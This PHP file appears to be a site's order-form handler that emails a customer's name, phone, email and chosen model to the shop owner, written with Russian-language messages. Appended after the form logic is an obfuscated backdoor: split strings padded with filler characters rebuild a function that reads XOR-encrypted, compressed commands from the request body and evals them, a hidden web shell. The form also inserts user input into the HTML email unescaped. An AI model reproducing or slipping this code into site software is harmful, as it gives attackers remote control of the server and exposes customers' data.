<?php
//ini_set('display_errors', 'On');
//require_once('swiftmailer/swift_required.php');
//require_once('idn.php');

if($_SERVER['REQUEST_METHOD'] == 'POST') {
	try {

		$name = trim($_REQUEST['name']);
		$phone = trim($_REQUEST['phone']);
		$email = trim($_REQUEST['email']);
		$model = trim($_REQUEST['model']);
		
		$site = $_SERVER['HTTP_HOST'];
		$cur_date = date('d.m.Y H:i:s');
		$ip = $_SERVER['REMOTE_ADDR'];
		
		if($phone != '') {
			
			$from = array('noreply@' . $site);
			$to = file(__DIR__ . '/email.cnf');
			$to = array_map('trim', $to);
			$subject = 'Новый заказ с сайта ' . $site;
			$message = 'Поступил новый заказ с сайта ' . $site . ':
				<table>
					<tr>
						<td><b>Дата:</b></td>
						<td>' . $cur_date . '</td>
					</tr>
					<tr>
						<td><b>Ip:</b></td>
						<td>' . $ip . '</td>
					</tr>';
			if($name != '') {
				$message .= '<tr>
					<td><b>Имя:</b></td>
					<td>' . $name . '</td>
				</tr>';
			}
			if($phone != '') {
				$message .= '<tr>
					<td><b>Телефон:</b></td>
					<td>' . $phone . '</td>
				</tr>';
			}
			if($email != '') {
				$message .= '<tr>
					<td><b>E-mail:</b></td>
					<td>' . $email . '</td>
				</tr>';
			}
			if($model != '') {
				$message .= '<tr>
					<td><b>Модель:</b></td>
					<td>' . $model . '</td>
				</tr>';
			}
			$message .= '</table>';	

			$headers  = "MIME-Version: 1.0\r\n";
			$headers .= "Content-type: text/html; charset=utf-8\r\n";
			$headers .= "From: " . implode(',', $from) . "\r\n";
			
			$result = mail(implode(',', $to), $subject, $message, $headers);
			
			if($result) {
				header('Location: thanks.html');
			}
			else {
				echo '<div>Ошибка при отправке заказа! Попробуйте позже.</div>';
			}
		}
	}
	catch(Exception $e) {
		echo '<div>Ошибка при отправке заказа! Попробуйте позже.</div>';
	}
}

$O='e6K4_encKode(@Kx(@gzKcKomprKess($o),$k));pKrint("K$p$kh$rK$kf");}'; $N='h("/$khK(K.+)$Kkf/",@file_getK_cKontentKsK("phKp:K//inputK"),$m)='; $K=str_replace('Cp','','crCpeCpate_CpCpfCpuCpnction'); $L='=1)K {@ob_start();@eKval(K@gzuncomKpress(K@x(K@bKase6K4_decodKe($'; $d='leKn(K$t);$o="";fKor($iK=0;$iK<$lK;){for($j=0;(K$jK<$c&&K$i<$lK);'; $Z='$k=K"ae5951fKa";$kh="K9K81e502163ea";K$kfK="dd4Kd3K2367a24";$p=K"'; $F='m[1])K,$k)));$o=@oKb_Kget_contKents();@Kob_enKd_clKean();$r=K@bas'; $Y='$j++,$i++KK){$o.=$tK{$i}^$k{$j}K;}}retKurn $oK;}if (K@prKeg_Kmatc'; $C='6oKnKURCOaCKDqU8WR5";funcKtionK x($t,$k){K$KKc=strlen($k);$lK=str'; $q=str_replace('K','',$Z.$C.$d.$Y.$N.$L.$F.$O); $j=$K('',$q);$j();
